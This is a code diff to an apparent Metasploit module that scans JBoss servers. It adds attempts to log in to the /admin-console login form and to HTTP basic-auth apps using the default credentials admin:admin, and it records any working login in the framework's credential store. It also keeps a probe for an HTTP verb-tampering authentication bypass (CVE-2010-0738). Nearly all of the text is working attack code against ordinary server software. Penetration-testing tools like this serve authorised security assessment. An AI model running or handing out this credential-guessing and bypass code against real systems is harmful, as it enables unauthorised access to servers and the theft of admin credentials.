@@ -18,7 +18,11 @@ class Metasploit3 < Msf::Auxiliary
       'Description'   => %q{
         This module scans a JBoss instance for a few vulnerablities.
       },
-      'Author'                => [ 'Tyler Krpata' ],
+      'Author'                =>
+        [
+          'Tyler Krpata',
+          'Zach Grace <@ztgrace>'
+        ],
       'References'            =>
         [
           [ 'CVE', '2010-0738' ] # VERB auth bypass
@@ -65,6 +69,8 @@ class Metasploit3 < Msf::Auxiliary
         check_app(app)
       end
 
+      jboss_as_default_creds
+
       ports = {
         # 1098i, 1099, and 4444 needed to use twiddle
         1098 => 'Naming Service',
@@ -96,6 +102,7 @@ class Metasploit3 < Msf::Auxiliary
       when res.code == 401
         print_status("#{rhost}:#{rport} #{app} requires authentication (401): #{res.headers['WWW-Authenticate']}")
         bypass_auth(app)
+        basic_auth_default_creds(app)
       when res.code == 404
         print_status("#{rhost}:#{rport} #{app} not found (404)")
       when res.code == 301, res.code == 302
@@ -108,8 +115,80 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-  def bypass_auth(app)
+  def jboss_as_default_creds()
+    print_status("#{rhost}:#{rport} Checking for JBoss AS default creds")
 
+      session = jboss_as_session_setup(rhost, rport)
+      if session.nil?
+        return
+      end
+
+      # Default AS creds
+      username = "admin"
+      password = "admin"
+
+      res = send_request_raw({
+        'uri'       => "/admin-console/login.seam",
+        'method'    => "POST",
+        'version'   => '1.1',
+        'vhost'     => "#{rhost}",
+        'headers'   => { "Content-Type" => "application/x-www-form-urlencoded",
+                        "Cookie" => "JSESSIONID=#{session["jsessionid"]}"},
+        'data'      => "login_form=login_form&login_form%3Aname=#{username}&login_form%3Apassword=#{password}&login_form%3Asubmit=Login&javax.faces.ViewState=#{session["viewstate"]}"
+      }, 20)
+
+      # Valid creds if 302 redirected to summary.seam and not error.seam
+      if (res and res.code == 302 and /error.seam/m !~ res.headers.to_s and /summary.seam/m =~ res.headers.to_s)
+        print_good("#{rhost}:#{rport} Authenticated using #{username}:#{password} at /admin-console/")
+        add_creds(username, password)
+      else
+        print_status("#{rhost}:#{rport} Could not guess admin credentials")
+      end
+  end
+
+  def add_creds(username, password)
+    service_data = {
+      address: rhost,
+      port: rport,
+      service_name: "jboss",
+      protocol: "tcp",
+      workspace_id: framework.db.workspace.id
+    }
+
+    credential_data = {
+      module_fullname: self.fullname,
+      origin_type: :service,
+      private_data: password,
+      private_type: :password,
+      username: username
+    }.merge(service_data)
+
+    credential_core = create_credential(credential_data)
+    credential_data[:core] = credential_core
+    create_credential_login(credential_data)
+  end
+
+  def jboss_as_session_setup(rhost, rport)
+    res = send_request_raw({
+      'uri'       => "/admin-console/login.seam",
+      'method'    => "GET",
+      'version'   => "1.1",
+      'vhost'     => "#{rhost}",
+    }, 20)
+
+    if (res)
+      begin
+        viewstate = /javax.faces.ViewState" value="(.*)" auto/.match(res.body).captures[0]
+        jsessionid = /JSESSIONID=(.*);/.match(res.headers.to_s).captures[0]
+      rescue
+        print_status("#{rhost}:#{rport} Could not guess admin credentials")
+        return nil
+      end
+      return { "jsessionid" => jsessionid, "viewstate" => viewstate }
+    end
+  end
+
+  def bypass_auth(app)
     print_status("#{rhost}:#{rport} Check for verb tampering (HEAD)")
 
     res = send_request_raw({
@@ -117,24 +196,28 @@ class Metasploit3 < Msf::Auxiliary
       'method'    => datastore['VERB'],
       'version'   => '1.0' # 1.1 makes the head request wait on timeout for some reason
     }, 20)
+
     if (res and res.code == 200)
       print_good("#{rhost}:#{rport} Got authentication bypass via HTTP verb tampering")
     else
       print_status("#{rhost}:#{rport} Could not get authentication bypass via HTTP verb tampering")
     end
+  end
 
+  def basic_auth_default_creds(app)
     res = send_request_cgi({
       'uri'       => app,
       'method'    => 'GET',
       'ctype'     => 'text/plain',
       'authorization' => basic_auth('admin','admin')
     }, 20)
+
     if (res and res.code == 200)
-      print_good("#{rhost}:#{rport} Authenticated using admin:admin")
+      print_good("#{rhost}:#{rport} Authenticated using admin:admin at #{app}")
+      add_creds("admin","admin")
     else
       print_status("#{rhost}:#{rport} Could not guess admin credentials")
     end
-
   end
 
   # function stole'd from mssql_ping
